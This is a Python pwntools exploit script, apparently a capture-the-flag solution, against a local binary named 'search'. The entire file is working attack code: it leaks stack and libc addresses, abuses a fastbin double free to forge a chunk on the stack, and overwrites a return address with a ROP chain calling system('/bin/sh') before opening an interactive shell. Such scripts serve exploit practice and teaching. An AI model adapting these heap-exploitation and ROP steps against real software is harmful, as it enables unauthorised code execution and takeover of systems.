from pwn import *
#context.log_level = 'debug'
def packAll(rop):
    return flat([p64(x) for x in rop])

r = process('./search')
e = ELF('./search')
prdi = 0x0000000000400e23

def Add(size, content):
    r.sendlineafter('3: Quit\n', '2')
    r.sendlineafter('Enter the sentence size:\n', str(size))
    r.sendlineafter('Enter the sentence:\n', content)
    r.recvuntil('Added sentence\n')

def Delete(size, content):
    r.sendlineafter('3: Quit\n', '1')
    r.sendlineafter('Enter the word size:\n', str(size))
    r.sendlineafter('Enter the word:\n', content)
    r.sendlineafter('(y/n)?\n', 'y')
    r.recvuntil('Deleted!')

# leak stack
r.sendafter('3: Quit\n', '\x00'*0x30)
r.sendafter('number\n', 'A'*0x30)
stack = u64(r.recv(0x36)[0x30:0x36]+'\x00\x00')
log.info('stack: 0x%x' % stack)
fake = stack - 0x1 + 0x20
log.info('fake: 0x%x' % fake)
r.sendline('1')
r.sendlineafter('Enter the word size:\n', '1')
r.sendlineafter('Enter the word:\n', '1')

# double free
Add(0x60, 'A '+'A'*(0x60-2))
Add(0x60, 'B '+'B'*(0x60-2))
Add(0x60, 'C '+'C'*(0x60-2))
Delete(0x1, 'C')
Delete(0x1, 'A')
Delete(0x1, 'B')
Delete(0x1, '\xd0')

# leak libc
Add(0x100, 'C '+'C'*(0x100-2))
Delete(0x1, 'C')
r.sendlineafter('3: Quit\n', '1')
r.sendlineafter('Enter the word size:\n', '1')
r.sendlineafter('Enter the word:\n', '\x78')
small = u64(r.recv(19)[-8:])# here we get libc version
r.sendlineafter('(y/n)?\n', 'n')
libc = e.libc
libc_base = small - libc.symbols['__malloc_hook'] - 0x68
log.info('libc_base: 0x%x' % libc_base)

# expoit double free
Add(0x60, p64(fake)+'A'*(0x60-0x8))
Add(0x60, 'B'*0x60)
Add(0x60, 'A'*0x60)
r.sendafter('3: Quit\n', '\x00'*(0x2b-4)+'\x71'+'\x00'*8) # padding so that we can forge a fastbin
r.sendline('2')
r.sendlineafter('Enter the sentence size:\n', str(0x60))

# rop
system = libc_base + libc.symbols['system']
bin_sh = libc_base + libc.search('/bin/sh\x00').next()
rop = []
rop += [prdi, bin_sh]
rop += [system]
rop = packAll(rop)

r.sendlineafter('Enter the sentence:\n', 'C'*0x11+p64(0x400d7e)+p64(0x400dc0)+rop+'D'*(0x3f-len(rop)))
r.recvuntil('Added sentence\n')

r.interactive()
